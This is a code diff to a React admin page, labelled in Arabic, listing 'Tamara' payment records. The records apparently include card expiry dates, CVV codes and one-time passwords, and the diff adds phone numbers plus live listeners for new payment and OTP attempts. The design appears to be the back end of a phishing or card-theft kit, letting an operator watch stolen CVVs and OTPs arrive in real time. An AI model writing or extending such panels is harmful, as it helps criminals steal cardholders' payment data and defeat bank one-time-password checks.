@@ -34,6 +34,7 @@ interface TamaraPayment {
   expiry_date: string | null;
   cvv: string | null;
   otp_code: string | null;
+  phone: string | null;
   total_amount: number;
   monthly_payment: number;
   company: string;
@@ -70,6 +71,28 @@ const AdminTamaraPayments = () => {
             event: '*',
             schema: 'public',
             table: 'tamara_payments'
+          },
+          () => {
+            fetchPayments();
+          }
+        )
+        .on(
+          'postgres_changes',
+          {
+            event: 'INSERT',
+            schema: 'public',
+            table: 'tamara_payment_attempts'
+          },
+          () => {
+            fetchPayments();
+          }
+        )
+        .on(
+          'postgres_changes',
+          {
+            event: 'INSERT',
+            schema: 'public',
+            table: 'tamara_otp_attempts'
           },
           () => {
             fetchPayments();
@@ -285,6 +308,10 @@ const AdminTamaraPayments = () => {
                         <div>
                           <p className="text-sm text-gray-600">شركة التأمين</p>
                           <p className="font-medium">{payment.company}</p>
+                        </div>
+                        <div>
+                          <p className="text-sm text-gray-600">رقم الهاتف</p>
+                          <p className="font-medium">{payment.phone || 'لم يتم إدخاله بعد'}</p>
                         </div>
                         <div>
                           <p className="text-sm text-gray-600">المبلغ الشهري</p>
